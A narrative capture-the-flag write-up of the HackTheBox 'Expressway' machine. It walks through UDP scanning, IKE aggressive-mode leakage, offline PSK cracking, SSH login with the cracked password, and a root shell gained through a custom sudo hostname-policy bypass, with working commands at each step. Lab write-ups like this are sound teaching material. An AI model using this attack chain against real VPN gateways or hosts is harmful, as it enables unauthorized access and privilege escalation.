# Breaking Through "Expressway"

Once upon a late-night session in the cyber underground, I stumbled across a fresh **“Expressway”** box on **HackTheBox** — a promised route to digital mastery and a cautionary tale of misconfigured VPN gateways and homemade privilege escalation tools. Like a true cyber-detective, I geared up, eager for something deeper than just artifact hunting. This wasn’t just about flags — it was about learning.

---

## Chapter 1: Recon — Listening for Opportunity

### The Opening Scene
Imagine the network as a vast, silent street—shrouded in shadows. My first step: turn on the headlights and see what’s out there.

### TCP Scan — First Pass, False Comfort
```bash
nmap -p- -T4 -sS 10.10.11.87 -oN initial_tcp_scan.txt
```
SSH (port 22) greets me and then slams the door in my face. No welcome mat here. The box seems as silent as a ghost. Seasoned hackers know—if you only look for doors, you might miss the windows.

### The UDP Angle — Where All the Clues Hide
```bash
sudo nmap -sU 10.10.11.87 --min-rate 5000
```
Port 500 lights up. IPsec/IKE. VPN land: hostile territory for most, but a playground for those who know the rules.

---

## Chapter 2: The VPN Enigma

### Aggressive Negotiations
IKE is like the bouncer at the Expressway nightclub—it checks IDs and sometimes lets a little info slip during “aggressive mode.” I deploy the toolkit:

```bash
sudo apt install ike-scan
sudo ike-scan -A 10.10.11.87
```

**"Aggressive Mode"** leaks something precious — a user ID: `ike@expressway.htb`. In this city, names are keys.

### Cracking the Vault — Snatching the Pre-Shared Key
I provoke the handshake to spill its hashed secrets:

```bash
sudo ike-scan -A 10.10.11.87 --id=ike@expressway.htb -Pike.psk
```

The file `ike.psk` contains the hashed PSK. I bring in heavy artillery: `psk-crack`.

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk
```

And in the wordlist, in classic CTF fashion, the passphrase **freakingrockstarontheroad** emerges. Weak credentials — the box builder’s favorite lesson. Never reuse your club’s master key as your personal password.

---

## Chapter 3: First Foothold — The Human Touch

### SSH: No Brute Force Needed
```bash
ssh ike@10.10.11.87
# Password: freakingrockstarontheroad
```

Success — the terminal blinks and I'm on! This is the first flag checkpoint, but the true journey is deeper.

```bash
cat ~/user.txt
```

What’s next? Enumeration — never trust surface impressions.

### Group Therapy: The Proxy Connection
```bash
id
# Output: uid=1000(ike) gid=1000(ike) groups=1000(ike),998(proxy)
```
`proxy`? Time to investigate. Every group on Linux has a story.

---

## Chapter 4: Squid Games — Secrets in the Logs

Through the foggy proxy glass, valuable traces appear:

```bash
ls -lh /var/log/squid/
cat /var/log/squid/access.log | grep DENIED
```

A denied request references `offramp.expressway.htb` — an internal hostname. That oddity will soon become crucial.

---

## Chapter 5: Sudo — The Trojan Command

### A Sudo Like No Other
Find the imposter:

```bash
which sudo
ls -lh /usr/local/bin/sudo
```

A custom `sudo`, tentatively setuid-root, oversized (1MB+). Never trust a custom lock without testing its mechanism.

```bash
sudo -l
```

The output reveals a hostname-based policy. Suspicious? Yes. Exploitable? Always check!

### Crafting the ByPass — When Policy Goes Awry
Remember that internal hostname? Here's how to break in:

```bash
/usr/local/bin/sudo -h offramp.expressway.htb /bin/bash
```

A root shell. All the alarms go silent — when a hostname check forgets who the real boss is. In real life, always audit custom binaries and their policies.

### Claiming the Spoils
```bash
cat /root/root.txt
```

The digital trophy — a flag is more than text. It’s a marker of your journey, your learning, your storytelling.

---

## Epilogue: Lessons from the Expressway

- **Aggressive Mode in IKE:** Easily leaks user IDs, allows offline dictionary attacks. *Real-life tip:* always disable aggressive mode on VPNs and use strong PSKs.
- **Password Reuse:** If your PSK doubles as your user password, you might as well hand attackers the keys. Rotate and randomize credentials!
- **Custom Sudo Policies:** Flawed logic in binaries handling hostname, groups, or chroots can turn privilege separation into a suggestion — not a rule.
- **Log Files as Intel:** Proxy logs, denied requests, and internal hostnames often reveal attack paths hidden from standard enumeration.
- **Latest Vulnerabilities Matter:** Staying informed about releases like **CVE-2025-32463** empowers you to pivot quickly if patching is incomplete.

---

## Final Thoughts
The **“Expressway”** revealed the junction between classic protocol weakness and modern privilege escalation. Each step cracked open a lesson: enumerate everything, question every binary, and find joy not just in the exploit, but in the understanding.
